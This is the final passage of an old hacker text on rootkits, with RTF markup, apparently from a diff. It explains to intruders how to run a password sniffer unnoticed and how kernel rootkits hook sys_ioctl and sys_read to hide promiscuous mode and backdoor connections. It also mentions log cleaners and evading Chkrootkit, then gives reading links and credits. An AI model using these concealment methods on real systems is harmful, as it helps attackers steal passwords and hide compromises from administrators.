+Now when running the sniffer make sure you add the character "&" behind of it, like this "lnsniffer&", the "&" tells the system to continue running the program even when the user is logged out. However, this does provoke a slightly higher risk. If you leave the Sniffer running all day and the sysadmin logs in he may notice something is up if he was to execute the "ps" command. Sniffers are great programs for getting passwords, if a TCP Sniffer was installed on a regular Ethernet connection you could capture a good 50 odd passwords! \line The downside to Sniffers are they may need to be modified slightly before you can run them, also some IDS programs can detect changes made to the Ethernet card (e.g. When the card is switched into promiscuous mode the IDS will know and alert the admin) :-(\par
+Now if your running a "Kernel rootkit" its quite easy to hide the Sniffer, because if the kernel rootkit is any good it should allow the Sniffer to hide the promiscuous flag of the network interface. The system call to Trojan in this case is sys_ioctl() (You don't really need to know that, unless your planning on writing your own kernel rootkit)\par
+"Hiding network connections" is another technique you may wish to use. To sucessfully hide network connections it can be done by preventing the system logging the activities\line inside \ldblquote /proc/net/tcp\rdblquote  and \ldblquote /proc/net/udp\rdblquote . The idea for a kernel rootkit is to trojan the\line sys_read() command. Whenever reading these two files and a line matching a unique string, the system call will hide it from user.\par
+The above techniques can then be brought together to successfully hide a backdoor. Most backdoors you install will listen on a certain port, this informartion is then logged into /proc/net/tcp and /proc/net.udp, you would need to manipulate the sys_read() system call to sucessfully hide the backdoor.\par
+Now it's important that you know using rootkits could be a very easy way to get busted. There have been times when I have just gone into a system with a custom made log cleaner and nothing else. System administrators are getting quite clever and with the rapid growth of advance programs like "Promiscuous Detectors" and "Chkrootkit" it's easy for the attacker to slip up and get busted. Kernel rootkits are the best type of rootkits to use when penetrating through a system but they are also the most complex and will require patience and understanding before they can be put to any real use.\line Before you just go out and install a bunch of rootkits on your "rooted boxes" I would strongly recommend experimenting with them on your own box, so you learn EXACTLY what they are doing. If you haven\rquote t got a box to practice on I recommend you download and install a copy of VMWare, NEVER take risks! There is more to life than computers, don't mess your whole life up with some stupid childish mistake!\par
+Now I'm finished here with rootkits (Partly because my fingers are getting tired) I hope you have learnt SOMETHING from this t-file. I am sorry that I didn't really go into much detail about kernel rootkits, system calls and LKM's or ways to protect yourself from such malicious software but this is the "First Edition" I do eventually plan to develop this paper and continuously add to it as rootkits develop but no promises ;-)\par
+Hope you learnt something; I will finish off this paper by leaving with you some useful links and recommended reading material.\par
+\line 15 - Recommended reading and useful Links\par
+Sunnie Hawkins, Understanding the Attackers Toolkit, January 13, 2001,URL:\line http://www.sans.org/infosecFAQ/linux/toolkit.htm\par
+Andrew R. Jones, A Review of Loadable Kernel Modules, June 12, 2001, URL:\line http://www.sans.org/infosecFAQ/linux/kernel_mods.htm\par
+Jason Drury, Sniffers: What are they and How to Protect From Them, November 11, 2000, URL:\line http://www.sans.org/infosecFAQ/switchednet/sniffers.htm\par
+DeokJo Jeon, Understanding DDOS Attack, Tools and Free Anti-tools with Recommendation,\line April 7, 2001,URL: http://www.sans.org/infosecFAQ/threats/understanding_ddos.htm\par
+Steve Gibson, The Strange Tale of the Denial OF Service Attacks Against GRC.COM, Gibson\line Research Corporation, Aug 31, 2001, URL: http://grc.com/dos/grcdos.htm\par
+Black Tie Affair, Hiding Out Under UNIX, Volume Three, Issue 25, File 6 of 11, March 25,\line 1989, URL: http://www.phrack.org/show.php?p=25&a=6\par
+Christopher Klaus, Backdoors, August 4 1997, URL: http://secinf.net/info/unix/backdoors.txt\par
+Cra58cker, A Crash Course in Backdoors: http://www.invisibleghosts.net\par
+16 - Credits\par
+This paper couldn't have been put together if it wasn't for the following people...\par
+Daremo - Explained the procedure used to disassemble and trace an installed rootkit.\par
+Cra58cker - I wrote this ;-)\par
+Invisible Ghosts - My inspiration\par
+Sailmap Manap - I quotes him quite a lot\par
+Invisible Evil - Helped with the hiding methods\par
+Mcaffee - Provided the analysis of the "T0rn" rootkit\par
+Author of T0rn - For giving me something to write about!\par
+\pard\f2\fs20\par
+}
+ 
